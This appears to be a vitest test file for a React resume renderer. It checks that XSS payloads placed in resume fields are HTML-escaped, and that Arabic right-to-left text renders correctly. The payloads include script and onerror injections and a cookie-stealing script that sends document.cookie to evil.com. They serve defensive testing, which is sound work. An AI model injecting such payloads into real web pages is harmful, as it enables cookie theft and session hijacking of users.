import { describe, it, expect } from "vitest";
import React from "react";
import { renderToStaticMarkup } from "react-dom/server";
import { SingleColumnTemplate } from "../src/SingleColumnTemplate.js";
import { renderResumeToHtml } from "../src/render-html.js";
import { SAMPLE_CV } from "../src/sample-cv.js";
import type { ResumeDocument } from "../src/types.js";

describe("XSS Neutralization via React Native Node Escaping (No DOMPurify)", () => {
  it("strictly escapes malicious script and onerror tags in preview and server HTML", () => {
    const maliciousDoc: ResumeDocument = {
      ...SAMPLE_CV,
      fullName: "Attacker <script>alert('xss_name')</script>",
      headline: 'Head <img src=x onerror="alert(1)">',
      summary: 'Bio <a href="javascript:alert(2)">click me</a>',
      experiences: [
        {
          id: "exp-xss",
          role: 'Role <iframe src="https://evil.com"></iframe>',
          company: "Company <style>body{background:red}</style>",
          startDate: "2020",
          bullets: [
            '<script>document.location="http://evil.com?c="+document.cookie</script>',
            'Bullet with payload <b onmouseover="alert(3)">hover</b>',
          ],
        },
      ],
    };

    // 1. Test React server-side rendering output
    const html = renderResumeToHtml(maliciousDoc);

    // Assert that executable tags are NEVER present as raw HTML elements
    expect(html).not.toContain("<script>alert('xss_name')</script>");
    expect(html).not.toContain('<img src=x onerror="alert(1)">');
    expect(html).not.toContain('<iframe src="https://evil.com"></iframe>');
    expect(html).not.toContain(
      '<script>document.location="http://evil.com?c="+document.cookie</script>',
    );

    // Assert that the characters are safely HTML-escaped by React
    expect(html).toContain(
      "&lt;script&gt;alert(&#x27;xss_name&#x27;)&lt;/script&gt;",
    );
    expect(html).toContain("&lt;img src=x onerror=&quot;alert(1)&quot;&gt;");
    expect(html).toContain(
      "&lt;iframe src=&quot;https://evil.com&quot;&gt;&lt;/iframe&gt;",
    );
  });

  it("safely renders bidirectional Arabic text with start-alignment and no kashida insertion", () => {
    const arabicDoc: ResumeDocument = {
      ...SAMPLE_CV,
      language: "ar",
      direction: "rtl",
      fullName: "أحمد محمود",
      headline: "مهندس برمجيات أول",
      summary: "خبرة واسعة في تطوير الأنظمة الموزعة.",
      style: {
        ...SAMPLE_CV.style,
        fontFamily: "Noto Sans Arabic",
      },
    };

    const html = renderResumeToHtml(arabicDoc);

    // Direction and language attributes
    expect(html).toContain('dir="rtl"');
    expect(html).toContain('lang="ar"');
    expect(html).toContain("text-align:start");
    expect(html).toContain("Noto Sans Arabic");

    // Zero kashida (tatweel '\u0640') present
    expect(html).not.toContain("\u0640");

    // Contact LTR isolation
    expect(html).toContain('<bdi dir="ltr">');
  });
});
